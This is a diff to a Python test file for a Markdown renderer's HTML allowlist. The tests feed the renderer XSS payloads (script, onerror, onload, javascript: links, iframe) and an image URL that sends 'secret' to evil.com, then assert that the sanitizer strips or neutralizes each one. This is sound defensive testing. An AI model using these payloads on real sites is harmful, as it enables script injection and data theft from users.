@@ -1,5 +1,6 @@
 """前端 Markdown 渲染（matrix/static/md.js）：链接只认安全地址，其余显示成文字加路径，不出现原样的 [文字](路径)；
-群聊里人发的消息也走它，@成员 用 mapText 只在正文里标出。
+群聊里人发的消息也走它，@成员 用 mapText 只在正文里标出。Markdown 里的 HTML 只认白名单里的标签和属性，按白名单重拼，
+外站图片不自动加载，标签补齐配对。
 
 用 node 直接跑 md.js；没装 node 时跳过（CI 三端的 runner 都带 node）。
 """
@@ -7,6 +8,7 @@
 from __future__ import annotations
 
 import json
+import re
 import shutil
 import subprocess
 from pathlib import Path
@@ -60,4 +62,44 @@ def test_mentions_not_marked_inside_code_links_or_tags():
                                         "[x](https://example.com/?q=@知识管家)", "<b>@知识管家</b>")
     assert code == "<p><code>@知识管家</code></p>"
     assert "mention" not in link and "mention" not in attr  # 链接文字和 href 里都不动
-    assert "<b>" not in unsafe and "&lt;b&gt;" in unsafe and '<span class="mention">@知识管家</span>' in unsafe
+    assert unsafe == '<p><b><span class="mention">@知识管家</span></b></p>'  # 白名单里的 HTML 照常渲染，里面的 @ 照样标出
+
+
+def test_html_in_markdown_renders_through_an_allowlist():
+    basic, block, attrs, table = render(
+        "a <b>粗</b> <kbd>Ctrl</kbd> H<sub>2</sub>O<br>换行",
+        "<details>\n<summary>展开</summary>\n\n- **列表**\n\n</details>\n\n后面",
+        '<div align="center" style="color:red" onclick="x()">居中</div>',
+        '<table>\n<tr><td colspan=2 rowspan="x">c</td></tr>\n</table>')
+    assert basic == "<p>a <b>粗</b> <kbd>Ctrl</kbd> H<sub>2</sub>O<br>换行</p>"
+    assert block == "<details> <summary>展开</summary><ul><li><strong>列表</strong></li></ul></details><p>后面</p>"
+    assert attrs == '<div align="center">居中</div>'  # style、事件属性丢掉
+    assert '<td colspan="2">c</td>' in table and "\n" not in table  # 消息正文是 pre-wrap：HTML 块里不留换行
+
+
+def test_html_outside_the_allowlist_never_reaches_the_page():
+    out = render("<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
+                 '<a href="javascript:alert(1)">坏</a>', '<a href="https://e.com" onmouseover="x">好</a>',
+                 '<b title="**x** https://e.com">t</b>', "`<b>代码</b>` 和 <!-- 注释 --> 后", "<iframe src=//e.com>")
+    script, img, svg, js, ok, title, code, iframe = out
+    for h in (script, img, svg, iframe):
+        assert "<" not in h.replace("<p>", "").replace("</p>", "")  # 原样显示成文字
+    assert js == "<p><a>坏</a></p>"
+    assert ok == '<p><a href="https://e.com" target="_blank" rel="noopener noreferrer">好</a></p>'
+    assert title == '<p><b title="**x** https://e.com">t</b></p>'  # 属性里的内容不再被当成 Markdown
+    assert code == "<p><code>&lt;b&gt;代码&lt;/b&gt;</code> 和  后</p>"
+    real_tags = [t for h in out for t in re.findall(r"<[^>]*>", h)]  # 显示成文字的 &lt;…&gt; 不算
+    assert not [t for t in real_tags if re.search(r"\s(on\w+|style)\s*=", t)]
+
+
+def test_external_images_are_links_not_loaded():
+    [html] = render('<img src="https://evil.com/p?d=secret" alt="图"> <img src="/static/logo.svg" width=20> <img src="//evil.com/x">')
+    assert '<a href="https://evil.com/p?d=secret" target="_blank" rel="noopener noreferrer">图</a>' in html
+    assert '<img src="/static/logo.svg" loading="lazy" width="20">' in html
+    assert html.count("<img") == 1  # 外站的（含 //host 写法）都不会自己去加载
+
+
+def test_tags_are_balanced_so_one_message_cannot_swallow_the_next():
+    unclosed, extra = render("<div>没关\n\n下一段", "多余</div></span>关闭")
+    assert unclosed == "<div>没关<p>下一段</p></div>"
+    assert extra == "<p>多余关闭</p>"
